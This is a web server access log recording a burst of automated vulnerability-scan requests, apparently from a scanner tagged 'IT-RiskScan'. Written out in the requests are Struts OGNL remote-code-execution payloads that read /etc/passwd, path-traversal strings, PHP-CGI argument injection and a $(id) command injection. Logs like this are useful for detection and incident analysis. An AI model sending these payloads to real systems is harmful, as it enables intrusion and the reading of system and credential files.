127.0.0.1 - - [03/Sep/2025:10:37:19 +0800] "HEAD / HTTP/1.1" 200 0 "-" "curl/8.4.0"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "PUT /_users/org.couchdb.user:poc HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /invoker/readonly HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /integration/saveGangster.action HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 555 "21.6.241.207/user/register" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /?id=9sca8U%25{128*128} HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /solr/admin/cores?wt=json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /_async/AsyncResponseService HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /jars/upload HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /_async/favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /lua/%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2ffind_prefs.lua.css HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /lua/.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2f.%2ffind_prefs.lua.css HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /webui/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /services/messagebroker/streamingamf HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /v6.58/Products/Authentication HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /app/rest/users/id:1/tokens/32QLO247oFCdyMlPO9udEYa2W2J;.jsp?jsp_precompile=true HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /storage/logs/laravel.log HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /tmp/temp.db%3f.1.1.1.1a-1.css HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /api/data HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /client/api?command=samlSso HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /solr/admin/info/properties:/admin/info/key HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /users HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /users;. HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /api/v0/train HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /dataSetParam/verification;swagger-ui/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /login?next=/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /@fs/C:/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /@fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /@fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 400 157 "-" "-"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /@fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /api/v1/validate/code HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /portalapi/v1/roles/option;%2fv1%2fping HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /api/jmeter/download/files HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /camunda/app/welcome/default/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /?query=SHOW%20DATABASES HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /api/snapshots HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /api/snapshots HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /apisix/admin/migrate/export HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /version HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /druid/submitLogin HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /druid/submitLogin HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /install.php?profile=default HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /core/install.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /api/dev/metrics/relation HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /login HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /index.php?r=site/user-login HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "POST /hub/login?next HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 IT-RiskScan"
9.135.100.135 - - [09/Sep/2025:07:08:50 +0800] "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
